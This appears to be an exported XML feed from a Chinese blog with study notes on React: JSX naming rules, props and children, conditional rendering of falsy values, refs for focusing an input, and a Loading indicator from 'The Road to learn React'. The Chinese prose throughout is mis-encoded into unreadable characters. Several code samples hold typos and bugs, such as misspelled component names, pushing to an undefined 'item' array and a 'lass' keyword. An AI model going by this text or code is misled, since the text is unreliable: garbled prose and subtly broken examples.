ç»„ä»¶ï¼Œå¯ä»¥æ–¹ä¾¿åœ°ä»Žä¸€ä¸ªæ¨¡å—ä¸­å¯¼å‡ºè®¸å¤š React ç»„ä»¶ 12345678910import React from &apos;react&apos;;const MyComponents = &#123; DatePicker : function DatePicker(props)&#123; return &lt;div&gt; Imagine a &#123; props.color &#125; datepicker here.&lt;/div&gt; &#125;&#125;function BlueDatePicker()&#123; return &lt;MyCompoents.DatePicker color = &quot;blue&quot;&gt;&#125; é¦–å­—æ¯å¤§å†™å½“å…ƒç´ ç±»åž‹ä»¥å°å†™å­—æ¯å¼€å¤´æ—¶ï¼Œå®ƒè¡¨ç¤ºä¸€ä¸ªå†…ç½®ç»„ä»¶ï¼Œå¦‚ &lt;div&gt; æˆ– &lt;span&gt;,å¹¶å°†å­—ç¬¦ä¸² &#39;div&#39; æˆ– &#39;span&#39; ä¼ é€’ç»™ React.createElement ã€‚ä»¥å¤§å†™å­—æ¯å¼€å¤´çš„ç±»åž‹ï¼Œå¦‚ &lt;Foo /&gt; ç¼–è¯‘ä¸º React.createElement(Foo) ï¼Œå¹¶å®ƒæ­£å¯¹åº”ä¸Žåœ¨ JavaScript æ–‡ä»¶ä¸­å®šä¹‰æˆ–å¯¼å…¥çš„ç»„ä»¶ ä¾‹å¦‚ï¼Œä¸‹é¢çš„ä»£ç å°†æ— æ³•æŒ‰é¢„æœŸè¿è¡Œï¼š 123456789101112import React from &apos;react&apos;;// é”™è¯¯ï¼ç»„ä»¶ååº”è¯¥é¦–å­—æ¯å¤§å†™:function hello(props) &#123; // æ­£ç¡®ï¼div æ˜¯æœ‰æ•ˆçš„ HTML æ ‡ç­¾: return &lt;div&gt;Hello &#123;props.toWhat&#125;&lt;/div&gt;;&#125;function HelloWorld() &#123; // é”™è¯¯ï¼React ä¼šå°†å°å†™å¼€å¤´çš„æ ‡ç­¾åè®¤ä¸ºæ˜¯ HTML åŽŸç”Ÿæ ‡ç­¾: return &lt;hello toWhat=&quot;World&quot; /&gt;;&#125; ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å°† hello é‡å‘½åä¸º Helloï¼Œç„¶åŽä½¿ç”¨ &lt;Hello /&gt; å¼•ç”¨ï¼š 123456789101112import React from &apos;react&apos;;// æ­£ç¡®ï¼ç»„ä»¶ååº”è¯¥é¦–å­—æ¯å¤§å†™:function Hello(props) &#123; // æ­£ç¡®ï¼div æ˜¯æœ‰æ•ˆçš„ HTML æ ‡ç­¾: return &lt;div&gt;Hello &#123;props.toWhat&#125;&lt;/div&gt;;&#125;function HelloWorld() &#123; // æ­£ç¡®ï¼React èƒ½å¤Ÿå°†å¤§å†™å¼€å¤´çš„æ ‡ç­¾åè®¤ä¸ºæ˜¯ React ç»„ä»¶ã€‚ return &lt;Hello toWhat=&quot;World&quot; /&gt;;&#125; åœ¨è¿è¡Œæ—¶é€‰æ‹©ç±»åž‹ä½ ä¸èƒ½ä½¿ç”¨è¡¨è¾¾å¼æ¥ä½œä¸º React å…ƒç´ çš„æ ‡ç­¾ã€‚å¦‚æžœä½ çš„ç¡®æƒ³é€šè¿‡è¡¨è¾¾å¼æ¥ç¡®å®š React å…ƒç´ çš„ç±»åž‹ï¼Œè¯·å…ˆå°†å…¶èµ‹å€¼ç»™å¤§å†™å¼€å¤´çš„å˜é‡ã€‚è¿™ç§æƒ…å†µä¸€èˆ¬ä¼šåœ¨ä½ æƒ³é€šè¿‡å±žæ€§å€¼æ¡ä»¶æ¸²æŸ“ç»„ä»¶æ—¶å‡ºçŽ°ï¼š 123456789101112import React from &apos;react&apos;;import &#123; PhotoStory, VideoStory &#125; from &apos;./stories&apos;;const components = &#123; photo: PhotoStory, video: VideoStory&#125;;function Story(props) &#123; // é”™è¯¯ï¼JSX æ ‡ç­¾åä¸èƒ½ä¸ºä¸€ä¸ªè¡¨è¾¾å¼ã€‚ return &lt;components[props.storyType] story=&#123;props.story&#125; /&gt;;&#125; è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦å…ˆå°†ç±»åž‹èµ‹å€¼ç»™å¤§å†™å¼€å¤´çš„å˜é‡ã€‚ 12345678910111213import React from &apos;react&apos;;import &#123; PhotoStory, VideoStory &#125; from &apos;./stories&apos;;const components = &#123; photo: PhotoStory, video: VideoStory&#125;;function Story(props) &#123; // æ­£ç¡®ï¼JSX æ ‡ç­¾åå¯ä»¥ä¸ºå¤§å†™å¼€å¤´çš„å˜é‡ã€‚ const SpecificStory = components[props.storyType]; return &lt;SpecificStory story=&#123;props.story&#125; /&gt;;&#125; å±žæ€§åœ¨ JSX ä¸­æœ‰å‡ ç§ä¸åŒçš„æ–¹å¼æ¥æŒ‡å®šå±žæ€§ ä½¿ç”¨ JavaScript è¡¨ç¤ºå¼å¯ä»¥ä¼ é€’ä»»ä½• {} åŒ…è£¹çš„ JavaScript è¡¨ç¤ºå¼ä½œä¸ºä¸€ä¸ªå±žæ€§å€¼ 1&lt;MyComponent foo = &#123; 1 + 2 + 3 + 4 &#125;&gt; if è¯­å¥å’Œ for å¾ªçŽ¯åœ¨ JavaScript ä¸­ä¸æ˜¯è¡¨è¾¾å¼ï¼Œå› æ­¤å®ƒä»¬ä¸èƒ½ç›´æŽ¥åœ¨ JSX ä¸­ä½¿ç”¨ï¼Œä½†æ˜¯å¯ä»¥æŠŠå®ƒä»¬æ”¾åœ¨å‘¨å›´çš„ä»£ç ä¸­ 123456789function NumberDescriber(props)&#123; let description; if(props.number % 2 == 0)&#123; description = &lt;strong&gt;even&lt;/strong&gt; &#125; else&#123; description = &lt;i&gt;odd&lt;/i&gt; &#125; return &lt;div&gt;&#123;props.number&#125; is an &#123;description&#125; number &lt;/div&gt;&#125; å­—ç¬¦ä¸²å¸¸é‡å¯ä»¥å°†å­—ç¬¦ä¸²å¸¸é‡ä½œä¸ºå±žæ€§å€¼ä¼ é€’ï¼Œä¸‹é¢çš„ JSX æ˜¯ç­‰ä»·çš„ 12&lt;MyCompoent message = &apos;hello world&apos; /&gt; &lt;MyConmpoent message = &#123; &apos;hello world&apos; &#125;&gt; å½“ä¼ é€’ä¸€ä¸ªå­—ç¬¦ä¸²å¸¸é‡æ—¶ï¼Œè¯¥å€¼ä¼šè¢«è§£æžä¸º HTML éžè½¬ä¹‰å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥ä¸‹é¢çš„ JSX è¡¨è¾¾å¼æ—¶ç›¸åŒçš„ 12&lt;MyCompoent message = &apos;3&apos; /&gt; &lt;MyConmpoent message = &#123; &apos;&lt;3&apos; &#125;&gt; é»˜è®¤ä¸º Trueå¦‚æžœæ²¡æœ‰ç»™å±žæ€§å€¼ï¼Œå®ƒé»˜è®¤æœ‰å±žæ€§ä¼ å€¼ï¼Œé»˜è®¤ä¸º true 12&lt;MyCompoent autocomplete /&gt; &lt;MyConmpoent autocomplete = &#123; true &#125;&gt; ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸å»ºè®®è¿™ä¹ˆä½¿ç”¨ï¼Œå› ä¸ºå®ƒhiä¸Ž ES6å¯¹è±¡ç®€æ´è¡¨ç¤ºæ³•æ··æ·†ã€‚æ¯”å¦‚ {foo} æ˜¯ {foo: foo} çš„ç®€å†™ï¼Œè€Œä¸æ˜¯ {foo: true}ã€‚è¿™é‡Œèƒ½è¿™æ ·ç”¨ï¼Œæ˜¯å› ä¸ºå®ƒç¬¦åˆ HTML çš„åšæ³•ã€‚ æ‰©å±•å±žæ€§å¦‚æžœå·²ç»æœ‰ props å±žæ€§ï¼Œå¹¶ä¸”æƒ³åœ¨ JSX ä¸­ä¼ é€’å®ƒï¼Œå¯ä»¥ä½¿ç”¨ ... ä½œä¸ºæ‰©å±•æ“ä½œç¬¦æ¥ä¼ é€’æ•´ä¸ªå±žæ€§å¯¹è±¡ 12345678function App1()&#123; return &lt;Greeting firstName = &quot;Ben&quot; lastName = &quot;Hector&quot; /&gt;;&#125;function App2()&#123; const props = &#123; firstName : &apos;Ben&apos; , lastName : &apos;Hector&apos; &#125;; return &lt;Greeting &#123;...props&#125; /&gt;&#125; å½“æž„é€ é€šç”¨å®¹å™¨æ—¶ï¼Œæ‰©å±•å±žæ€§ä¼šéžå¸¸æœ‰ç”¨ï¼Œç„¶è€Œè¿™æ ·åšä¹Ÿæœ‰å¯èƒ½è®©å¾ˆå¤šä¸ç›¸å…³çš„å±žæ€§ï¼Œä¼ é€’åˆ°ä¸éœ€è¦å®ƒä»¬çš„ç»„ä»¶ä¸­ä½¿å¾—ä»£ç éžå¸¸æ··ä¹±ï¼Œè°¨æ…Žè¿™ä¸ªç”¨æ³• å­ä»£åœ¨åŒ…å«å¼€å§‹å’Œç»“æŸæ ‡ç­¾çš„ JSX è¡¨è¾¾å¼ä¸­ï¼Œæ ‡è®°ä¹‹é—´çš„å†…å®¹ä½œä¸ºç‰¹æ®Šçš„å‚æ•°ä¼ é€’ ï¼š props.children ï¼Œæœ‰å‡ ç§ä¸åŒçš„æ–¹æ³•æ¥ä¼ é€’å­ä»£ å­—ç¬¦ä¸²å¸¸é‡-å¯ä»¥åœ¨å¼€å§‹å’Œç»“æŸæ ‡ç­¾ä¹‹é—´æ”¾å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œåˆ™ props.children å°±æ˜¯é‚£ä¸ªå­—ç¬¦ä¸²ï¼Œå¯¹äºŽå¾ˆå¤šå†…ç½® HTML å…ƒç´ å¾ˆæœ‰ç”¨ 1&lt;MyComponent&gt; Hello World! &lt;/MyComponent&gt; è¿™æ˜¯æœ‰æ•ˆçš„ JSX ï¼Œå¹¶ä¸” MyComponent çš„ props.children å€¼å°†ä¼šç›´æŽ¥æ˜¯ hello world! å› ä¸º HTML æœªè½¬ä¹‰ï¼Œæ‰€ä»¥å¯ä»¥åƒ HTML ä¸€æ ·å†™ JSX 1&lt;div&gt; This is valid HTML \ JSX at the same time &lt;/div&gt; JSX ä¼šç§»é™¤ç©ºè¡Œå’Œå¼€å§‹ä¸Žç»“å°¾å¤„çš„ç©ºæ ¼ã€‚æ ‡ç­¾é‚»è¿‘çš„æ–°è¡Œä¹Ÿä¼šè¢«ç§»é™¤ï¼Œå­—ç¬¦ä¸²å¸¸é‡å†…éƒ¨çš„æ¢è¡Œä¼šè¢«åŽ‹ç¼©æˆä¸€ä¸ªç©ºæ ¼ï¼Œæ‰€ä»¥ä¸‹é¢è¿™äº›éƒ½ç­‰ä»·ï¼š 123456789101112131415&lt;div&gt;Hello World&lt;/div&gt;&lt;div&gt; Hello World&lt;/div&gt;&lt;div&gt; Hello World&lt;/div&gt;&lt;div&gt; Hello World&lt;/div&gt; JSXå¯ä»¥é€šè¿‡å­ä»£åµŒå…¥æ›´å¤šçš„ JSX å…ƒç´ ï¼Œè¿™å¯¹äºŽåµŒå¥—æ˜¾ç¤ºç»„ä»¶éžå¸¸æœ‰ç”¨ï¼š 1234&lt;MyContainer&gt; &lt;MyFirstComponent /&gt; &lt;MySecondComponent /&gt;&lt;/MyContainer&gt; ä½ å¯ä»¥æ··åˆä¸åŒç±»åž‹çš„å­å…ƒç´ ï¼ŒåŒæ—¶ç”¨å­—ç¬¦ä¸²å¸¸é‡å’Œ JSX å­å…ƒç´ ï¼Œè¿™æ˜¯ JSX ç±»ä¼¼ HTML çš„å¦ä¸€ç§å½¢å¼ï¼Œè¿™åœ¨ JSX å’Œ HTML ä¸­éƒ½æ˜¯æœ‰æ•ˆçš„ï¼š 1234567&lt;div&gt; Here is a list: &lt;ul&gt; &lt;li&gt;Item 1&lt;/li&gt; &lt;li&gt;Item 2&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt; React ç»„ä»¶ä¹Ÿå¯ä»¥é€šè¿‡æ•°ç»„çš„å½¢å¼è¿”å›žå¤šä¸ªå…ƒç´ ï¼š 123456789render() &#123; // ä¸éœ€è¦ä½¿ç”¨é¢å¤–çš„å…ƒç´ åŒ…è£¹æ•°ç»„ä¸­çš„å…ƒç´  return [ // ä¸è¦å¿˜è®° key :) &lt;li key=&quot;A&quot;&gt;First item&lt;/li&gt;, &lt;li key=&quot;B&quot;&gt;Second item&lt;/li&gt;, &lt;li key=&quot;C&quot;&gt;Third item&lt;/li&gt;, ];&#125; JavaScript è¡¨è¾¾å¼å¯ä»¥å°†ä»»ä½• {} åŒ…è£¹çš„ JavaScript è¡¨è¾¾å¼ä½œä¸ºå­ä»£ä¼ é€’ã€‚ä¾‹å¦‚ï¼Œä¸‹é¢è¿™äº›è¡¨è¾¾å¼æ˜¯ç­‰ä»·çš„ï¼š \foo\\{â€˜fooâ€™}\ è¿™å¯¹äºŽæ¸²æŸ“ä»»æ„é•¿åº¦çš„ JSX è¡¨è¾¾å¼çš„åˆ—è¡¨å¾ˆæœ‰ç”¨ã€‚ä¾‹å¦‚ï¼Œä¸‹é¢å°†ä¼šæ¸²æŸ“ä¸€ä¸ª HTML åˆ—è¡¨ï¼š 123456789function Item(props)&#123; return &lt;li&gt;&#123; props.message &#125;&lt;/li&gt;&#125;function TodoList()&#123; const todos = [&apos;finish doc&apos; , &apos;submit pr&apos; , &apos;nag dan to review&apos;]; return( &lt;ul&gt; &#123;todos.map( (message) =&gt; &lt;Item message = &#123; message &#125; key = &#123; message &#125;&gt; )&#125; &lt;/ul&gt; )&#125; JavaScript è¡¨è¾¾å¼å¯ä»¥ä¸Žå…¶ä»–ç±»åž‹çš„å­ä»£æ··åˆä½¿ç”¨ï¼Œè¿™é€šå¸¸å¯¹äºŽå­—ç¬¦ä¸²æ¨¡æ¿éžå¸¸æœ‰ç”¨ 123function Hello(props)&#123; return &lt;div&gt; Hello &#123; props.address &#125; !&lt;/div&gt;&#125; å‡½æ•°é€šå¸¸æƒ…å†µä¸‹ï¼Œæ’å…¥ JSX ä¸­çš„ JavaScript è¡¨è¾¾å¼è®¤ä½œå­—ç¬¦ä¸², React æˆ–è¿™äº›å†…å®¹çš„åˆ—è¡¨ã€‚ç„¶è€Œï¼Œ props.children å¯ä»¥åƒå…¶ä»–å±žæ€§ä¸€æ ·ä¼ é€’ä»»ä½•æ•°æ®ï¼Œè€Œä¸ä»…ä»…æ˜¯ React å…ƒç´ ã€‚ä¾‹å¦‚ï¼Œå¦‚æžœä½ ä½¿ç”¨è‡ªå®šä¹‰ç»„ä»¶ï¼Œåˆ™å¯ä»¥å°†è°ƒç”¨ props.children æ¥èŽ·å¾—ä¼ é€’çš„å­ä»£ 123456789101112131415function Repeat(props)&#123; let items = []; for(let i = 0; i &lt; props.numTimes; i++)&#123; item.push( props.children(i) ); &#125; return &lt;div&gt;&#123; item &#125;&lt;/div&gt;&#125;function ListOfTenThings()&#123; return( &lt;Repeat numTimes = &#123;10&#125;&gt; &#123; (index) =&gt; &lt;div key =&#123;index&#125;&gt;This is item &#123;index&#125; in the list &lt;/div&gt; &#125; &lt;/Repeat&gt; )&#125; ä¼ é€’ç»™è‡ªå®šä¹‰ç»„ä»¶çš„å­ä»£å¯ä»¥æ˜¯ä»»ä½•çš„å…ƒç´ ï¼Œåªè¦è¯¥ç»„ä»¶åœ¨ React æ¸²æŸ“é’±å°†å…¶è½¬æ¢æˆ React èƒ½å¤Ÿç†è§£çš„ä¸œè¥¿ï¼Œè¿™ä¸ªç”¨æ³•å¹¶ä¸å¸¸è§ï¼Œä½†æ˜¯å½“ä½ æƒ³æ‰©å±• JSX æ—¶å¯ä»¥ä½¿ç”¨ å¸ƒå°”å€¼ ã€ Null å’Œ Undefined è¢«å¿½ç•¥false ã€ null ã€ undefined å’Œ true éƒ½æ˜¯æœ‰æ•ˆçš„å­ä»£ï¼Œä½†å®ƒä»¬ä¸ä¼šç›´æŽ¥è¢«æ¸²æŸ“ã€‚ä¸‹é¢çš„è¡¨è¾¾å¼æ˜¯ç­‰ä»·çš„ï¼š 1234567891011&lt;div /&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&#123;false&#125;&lt;/div&gt;&lt;div&gt;&#123;null&#125;&lt;/div&gt;&lt;div&gt;&#123;undefined&#125;&lt;/div&gt;&lt;div&gt;&#123;true&#125;&lt;/div&gt; è¿™åœ¨æ ¹æ®æ¡ä»¶æ¥ç¡®å®šæ˜¯å¦æ¸²æŸ“ React å…ƒç´ æ—¶éžå¸¸æœ‰ç”¨ã€‚ä»¥ä¸‹çš„ JSX åªä¼šåœ¨ showHeader ä¸º true æ—¶æ¸²æŸ“ &lt;Header /&gt; ç»„ä»¶ã€‚ 1234&lt;div&gt; &#123;showHeader &amp;&amp; &lt;Header /&gt;&#125; &lt;Content /&gt;&lt;/div&gt; å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒJavaScript ä¸­çš„ä¸€äº› â€œfalsyâ€ å€¼(æ¯”å¦‚æ•°å­—0)ï¼Œå®ƒä»¬ä¾ç„¶ä¼šè¢«æ¸²æŸ“ã€‚ä¾‹å¦‚ï¼Œä¸‹é¢çš„ä»£ç ä¸ä¼šåƒä½ é¢„æœŸçš„é‚£æ ·è¿è¡Œï¼Œå› ä¸ºå½“ props.message ä¸ºç©ºæ•°ç»„æ—¶ï¼Œå®ƒä¼šæ‰“å° 0: 12345&lt;div&gt; &#123;props.messages.length &amp;&amp; &lt;MessageList messages=&#123;props.messages&#125; /&gt; &#125;&lt;/div&gt; è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œè¯·ç¡®ä¿ &amp;&amp; å‰é¢çš„è¡¨è¾¾å¼å§‹ç»ˆä¸ºå¸ƒå°”å€¼ï¼š 12345&lt;div&gt; &#123;props.messages.length &gt; 0 &amp;&amp; &lt;MessageList messages=&#123;props.messages&#125; /&gt; &#125;&lt;/div&gt; ç›¸åï¼Œå¦‚æžœä½ æƒ³è®©ç±»ä¼¼ false ã€true ã€null æˆ– undefined å‡ºçŽ°åœ¨è¾“å‡ºä¸­ï¼Œä½ å¿…é¡»å…ˆæŠŠå®ƒè½¬æ¢æˆå­—ç¬¦ä¸² : 123&lt;div&gt; My JavaScript variable is &#123;String(myVariable)&#125;.&lt;/div&gt; æ³¨è§£ï¼šJavaScript ä¸­ falsy å€¼çš„ä¾‹å­ (å°† falsy å€¼è½¬æ¢ä¸º false ): 12345678if (false) if (null) if (undefined) if (0) if (NaN) if (&apos;&apos;) if (&quot;&quot;) if (document.all)]]></content>
      <categories>
        <category>reactç›¸å…³</category>
      </categories>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[The Road to learn React Part4]]></title>
    <url>%2F2018-06-26-TheRoadtolearnReactPart4.html</url>
    <content type="text"><![CDATA[The Road to learn Reactä¹¦ç±å­¦ä¹ ç¬”è®°(ç¬¬å››ç« ) é«˜çº§Reactç»„ä»¶æœ¬ç« å°†é‡ç‚¹ä»‹ç»é«˜çº§ React ç»„ä»¶çš„å®žçŽ°ã€‚æˆ‘ä»¬å°†äº†è§£ä»€ä¹ˆæ˜¯é«˜é˜¶ç»„ä»¶ä»¥åŠå¦‚ä½•å®žçŽ°å®ƒä»¬ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜å°†æ·±å…¥æŽ¢è®¨ React ä¸­æ›´é«˜çº§çš„ä¸»é¢˜ï¼Œå¹¶ç”¨å®ƒå®žçŽ°å¤æ‚çš„äº¤äº’åŠŸèƒ½ã€‚ å¼•ç”¨ DOM å…ƒç´ æœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦åœ¨ React ä¸Ž DOM èŠ‚ç‚¹è¿›è¡Œäº¤äº’ã€‚ ref å±žæ€§å¯ä»¥è®©æˆ‘ä»¬è®¿é—®å…ƒç´ ä¸­çš„ä¸€ä¸ªèŠ‚ç‚¹ï¼Œé€šå¸¸ï¼Œè®¿é—® DOM èŠ‚ç‚¹æ˜¯ React ä¸­çš„ä¸€ä¸ªåæ¨¡å¼ï¼Œå› ä¸ºæˆ‘ä»¬åº”è¯¥éµå¾ªå®ƒçš„å£°æ˜Žå¼ç¼–ç¨‹å’Œå•å‘æ•°æ®æµã€‚å½“æˆ‘ä»¬å¼•å…¥ç¬¬ä¸€æœç´¢ç»„ä»¶æ—¶ï¼Œå°±å·²ç»äº†è§£åˆ€è¿™äº›é—®é¢˜ï¼Œä½†æ˜¯åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä»ç„¶è¦è®¿é—® DOM èŠ‚ç‚¹ã€‚å®˜æ–¹æ–‡æ¡£æåˆ°äº†ä¸‰ç§æƒ…å†µä½¿ç”¨ DOM API(focusäº‹ä»¶ï¼Œåª’ä½“æ’­æ”¾ç­‰)è°ƒç”¨å‘½ä»¤å¼ DOM èŠ‚ç‚¹åŠ¨ç”»ä¸Žéœ€è¦ DOM èŠ‚ç‚¹çš„ç¬¬ä¸‰æ–¹åº“é›†æˆ è®©æˆ‘ä»¬é€šè¿‡ Search ç»„ä»¶è¿™ä¸ªä¾‹å­çœ‹ä¸€ä¸‹ã€‚å½“åº”ç”¨ç¨‹åºç¬¬ä¸€æ¬¡æ¸²æŸ“æ—¶ï¼Œinput å­—æ®µåº”è¯¥è¢«èšç„¦ã€‚è¿™æ˜¯éœ€è¦è®¿é—® DOM API çš„ä¸€ç§ç”¨ä¾‹ã€‚æœ¬ç« å°†å±•ç¤ºæ¸²æŸ“æ—¶èšç„¦ input å­—æ®µæ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œä½†ç”±äºŽè¿™ä¸ªåŠŸèƒ½å¯¹äºŽåº”ç”¨ç¨‹åºå¹¶ä¸æ˜¯å¾ˆæœ‰ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†åœ¨æœ¬ç« ä¹‹åŽçœç•¥è¿™äº›æ›´æ”¹ã€‚å°½ç®¡å¦‚æ­¤ï¼Œä½ ä»ç„¶å¯ä»¥ä¸ºè‡ªå·±çš„åº”ç”¨ç¨‹åºä¿ç•™å®ƒã€‚ é€šå¸¸ï¼Œæ— çŠ¶æ€ç»„ä»¶å’Œ ES6 ç±»ç»„ä»¶ä¸­éƒ½å¯ä»¥ä½¿ç”¨ ref å±žæ€§ã€‚åœ¨èšç„¦ input å­—æ®µçš„ç”¨ä¾‹ä¸­ï¼Œæˆ‘ä»¬å°±éœ€è¦ä¸€ä¸ªç”Ÿå‘½å‘¨æœŸæ–¹æ³•ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæŽ¥ä¸‹æ¥ä¼šå…ˆåœ¨ ES6 ç±»ç»„ä»¶ä¸­å±•ç¤ºå¦‚ä½•ä½¿ç”¨ ref å±žæ€§ã€‚ ç¬¬ä¸€æ­¥æ˜¯å°†æ— çŠ¶æ€ç»„ä»¶é‡æž„ä¸º ES6 ç±»ç»„ä»¶ã€‚ 1234567891011121314151617181920212223class Search extends Component &#123; render() &#123; const &#123; value, onChange, onSubmit, children &#125; = this.props; return ( &lt;form onSubmit=&#123;onSubmit&#125;&gt; &lt;input type=&quot;text&quot; value=&#123;value&#125; onChange=&#123;onChange&#125; /&gt; &lt;button type=&quot;submit&quot;&gt; &#123;children&#125; &lt;/button&gt; &lt;/form&gt; ); &#125;&#125; ES6 ç±»ç»„ä»¶çš„thiså¯¹è±¡å¯ä»¥å¸®åŠ©æˆ‘ä»¬é€šè¿‡ ref å±žæ€§å¼•ç”¨ DOM èŠ‚ç‚¹ã€‚ 123456789101112131415161718192021222324class Search extends Component &#123; render() &#123; const &#123; value, onChange, onSubmit, children &#125; = this.props; return ( &lt;form onSubmit=&#123;onSubmit&#125;&gt; &lt;input type=&quot;text&quot; value=&#123;value&#125; onChange=&#123;onChange&#125; ref=&#123;(node) =&gt; &#123; this.input = node; &#125;&#125; /&gt; &lt;button type=&quot;submit&quot;&gt; &#123;children&#125; &lt;/button&gt; &lt;/form&gt; ); &#125;&#125; çŽ°åœ¨ï¼Œä½ å¯ä»¥é€šè¿‡ä½¿ç”¨ this å¯¹è±¡ã€é€‚å½“çš„ç”Ÿå‘½å‘¨æœŸæ–¹æ³•å’Œ DOM API åœ¨ç»„ä»¶æŒ‚è½½çš„æ—¶å€™æ¥èšç„¦ input å­—æ®µ 123456789101112131415161718192021222324252627282930lass Search extends Component &#123; componentDidMount() &#123; if(this.input) &#123; this.input.focus(); &#125; &#125; render() &#123; const &#123; value, onChange, onSubmit, children &#125; = this.props; return ( &lt;form onSubmit=&#123;onSubmit&#125;&gt; &lt;input type=&quot;text&quot; value=&#123;value&#125; onChange=&#123;onChange&#125; ref=&#123;(node) =&gt; &#123; this.input = node; &#125;&#125; /&gt; &lt;button type=&quot;submit&quot;&gt; &#123;children&#125; &lt;/button&gt; &lt;/form&gt; ); &#125;&#125; å½“åº”ç”¨ç¨‹åºæ¸²æŸ“æ—¶ï¼Œinput å­—æ®µåº”è¯¥è¢«èšç„¦ã€‚è¿™å°±æ˜¯refå±žæ€§çš„åŸºæœ¬ç”¨æ³•ã€‚ ä½†æ˜¯æˆ‘ä»¬æ€Žæ ·åœ¨æ²¡æœ‰thiså¯¹è±¡çš„æ— çŠ¶æ€ç»„ä»¶ä¸­è®¿é—®refå±žæ€§å‘¢ï¼ŸæŽ¥ä¸‹æ¥æˆ‘ä»¬åœ¨æ— çŠ¶æ€ç»„ä»¶ä¸­æ¼”ç¤ºã€‚ 123456789101112131415161718192021const Search = (&#123; value, onChange, onSubmit, children &#125;) =&gt; &#123; let input; return ( &lt;form onSubmit=&#123;onSubmit&#125;&gt; &lt;input type=&quot;text&quot; value=&#123;value&#125; onChange=&#123;onChange&#125; ref=&#123;(node) =&gt; input = node&#125; /&gt; &lt;button type=&quot;submit&quot;&gt; &#123;children&#125; &lt;/button&gt; &lt;/form&gt; );&#125; åŠ è½½çŽ°åœ¨è®©æˆ‘ä»¬å›žåˆ°åº”ç”¨ç¨‹åºã€‚å½“å‘ Hacker News API å‘èµ·æœç´¢è¯·æ±‚æ—¶ï¼Œæˆ‘ä»¬æƒ³è¦æ˜¾ç¤ºä¸€ä¸ªåŠ è½½æŒ‡ç¤ºç¬¦ã€‚ è¯·æ±‚æ˜¯å¼‚æ­¥çš„ï¼Œæ­¤æ—¶åº”è¯¥å‘ç”¨æˆ·å±•ç¤ºæŸäº›äº‹æƒ…å³å°†å‘ç”Ÿçš„æŸç§åé¦ˆã€‚è®©æˆ‘ä»¬åœ¨ srcï¼App.js ä¸­å®šä¹‰ä¸€ä¸ªå¯é‡ç”¨çš„ Loading ç»„ä»¶ã€‚ const Loading = () =&gt;\Loading â€¦\ çŽ°åœ¨ä½ å°†éœ€è¦ä¸€ä¸ªå±žæ€§æ¥å­˜å‚¨åŠ è½½çŠ¶æ€ã€‚æ ¹æ®åŠ è½½çŠ¶æ€å¯ä»¥å†³å®šç¨åŽæ˜¯å¦æ˜¾ç¤ºæ‰€åŠ è½½çš„ç»„ä»¶ã€‚ src/App.js 123456789101112131415161718class App extends Component &#123; constructor(props) &#123; super(props); this.state = &#123; results: null, searchKey: &apos;&apos;, searchTerm: DEFAULT_QUERY, error: null, isLoading: false, &#125;; ...&#125;...&#125; isLoading çš„åˆå§‹å€¼æ˜¯ falseã€‚åœ¨ App ç»„ä»¶æŒ‚è½½å®Œæˆä¹‹å‰ï¼Œæ— éœ€åŠ è½½ä»»ä½•ä¸œè¥¿ã€‚ å½“å‘èµ·è¯·æ±‚æ—¶ï¼Œå°†åŠ è½½çŠ¶æ€ (isLoading) è®¾ç½®ä¸º trueã€‚æœ€ç»ˆï¼Œè¯·æ±‚ä¼šæˆåŠŸï¼Œé‚£æ—¶å¯ä»¥å°†åŠ è½½çŠ¶æ€ (isLoading) è®¾ç½®ä¸º falseã€‚ src/App.js 1234567891011121314151617181920212223242526272829class App extends Component &#123;...setSearchTopStories(result) &#123; ... this.setState(&#123; results: &#123; ...results, [searchKey]: &#123; hits: updatedHits, page &#125; &#125;, isLoading: false &#125;); &#125; fetchSearchTopStories(searchTerm, page = 0) &#123; this.setState(&#123; isLoading: true &#125;); fetch(`$&#123;PATH_BASE&#125;$&#123;PATH_SEARCH&#125;?$&#123;PARAM_SEARCH&#125;$&#123;searchTerm&#125;&amp;$&#123;PARAM_PAGE&#125;\ $&#123;page&#125;&amp;$&#123;PARAM_HPP&#125;$&#123;DEFAULT_HPP&#125;`) .then(response =&gt; response.json()) .then(result =&gt; this.setSearchTopStories(result)) .catch(e =&gt; this.setState(&#123; error: e &#125;)); &#125; ...&#125; æœ€åŽä¸€æ­¥ï¼Œæˆ‘ä»¬å°†åœ¨åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨ Loading ç»„ä»¶ã€‚åŸºäºŽåŠ è½½çŠ¶æ€ (isLoading) çš„æ¡ä»¶æ¥å†³å®šæ¸²æŸ“ Loading ç»„ä»¶æˆ– Button ç»„ä»¶ã€‚åŽè€…ä¸ºä¸€ä¸ªç”¨äºŽèŽ·å–æ›´å¤šæ•°æ®çš„æŒ‰é’®ã€‚ src/App.js 12345678910111213141516171819202122232425262728293031class App extends Component &#123; ... render() &#123; const &#123; searchTerm, results, searchKey, error, isLoading &#125; = this.state; ... return ( &lt;div className=&quot;page&quot;&gt; ... &lt;div className=&quot;interactions&quot;&gt; &#123; isLoading ? &lt;Loading /&gt; : &lt;Button onClick=&#123;() =&gt; this.fetchSearchTopStories(searchKey, page + 1)&#125;&gt; More &lt;/Button&gt; &#125; &lt;/div&gt; &lt;/div&gt; ); &#125;&#125; ç”±äºŽæˆ‘ä»¬åœ¨componentDidMountï¼ˆï¼‰ä¸­å‘èµ·è¯·æ±‚ï¼ŒLoading ç»„ä»¶ä¼šåœ¨åº”ç”¨ç¨‹åºå¯åŠ¨çš„æ—¶å€™æ˜¾ç¤ºã€‚æ­¤æ—¶ï¼Œå› 